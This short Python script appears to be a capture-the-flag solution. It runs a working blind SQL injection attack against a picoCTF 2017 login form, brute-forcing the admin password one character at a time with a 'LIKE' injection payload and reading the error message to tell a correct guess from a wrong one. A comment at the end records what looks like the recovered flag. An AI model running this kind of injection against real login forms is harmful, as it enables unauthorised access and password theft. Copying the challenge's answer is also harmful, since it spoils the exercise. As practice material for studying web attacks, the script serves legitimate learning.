import requests

prev = ""
chars = 'abcdefghijklmnopqrstuvwxyz_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range(0,63):
    for char in chars:
        r = requests.post("http://shell2017.picoctf.com:16012/", data={'username': 'admin', 'password': "' or '1'='1' and pass LIKE '"+prev+char+"%"})
        div = '<div class="alert alert-danger" role="alert">'
        strong = '<strong>'
        txt = r.text[r.text.find(div)+len(div):]
        txt = txt[:txt.find('</strong>')]
        txt = txt[txt.find(strong)+len(strong):]
        if txt != "Incorrect Password.":
            prev += char
            break
        r.connection.close()
    print prev

#not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f515